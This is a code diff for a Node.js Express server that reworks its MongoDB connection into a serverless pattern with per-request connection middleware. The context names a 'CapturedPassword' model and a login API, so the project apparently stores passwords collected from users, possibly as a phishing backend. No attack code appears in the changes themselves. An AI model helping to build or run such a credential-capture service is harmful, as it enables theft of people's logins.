@@ -12,14 +12,17 @@ app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
-// --- Connect to MongoDB Atlas ---
-mongoose.connect(process.env.MONGODB_URI)
-.then(() => {
-    console.log('Successfully connected to MongoDB Atlas');
-})
-.catch(err => {
-    console.error('Error connecting to MongoDB Atlas:', err.message); 
-});
+// --- Connect to MongoDB Atlas (Serverless Pattern) ---
+const connectDB = async () => {
+    if (mongoose.connection.readyState >= 1) return;
+    try {
+        await mongoose.connect(process.env.MONGODB_URI);
+        console.log('Successfully connected to MongoDB Atlas');
+    } catch (err) {
+        console.error('Error connecting to MongoDB:', err.message);
+        throw err;
+    }
+};
 
 // --- Define MongoDB Schemas and Models ---
 const passwordSchema = new mongoose.Schema({
@@ -44,6 +47,18 @@ const verificationSchema = new mongoose.Schema({
 
 const CapturedPassword = mongoose.model('CapturedPassword', passwordSchema);
 const UserVerification = mongoose.model('UserVerification', verificationSchema);
+
+// --- DB Connection Middleware for Serverless ---
+app.use(async (req, res, next) => {
+    if (req.path.startsWith('/api') || req.path.startsWith('/admin')) {
+        try {
+            await connectDB();
+        } catch (error) {
+            return res.status(500).json({ success: false, error: 'Database connection failed. Please check MongoDB IP Whitelisting.' });
+        }
+    }
+    next();
+});
 
 // --- API Routes (now using Mongoose) ---
 app.post('/api/login', async (req, res) => {
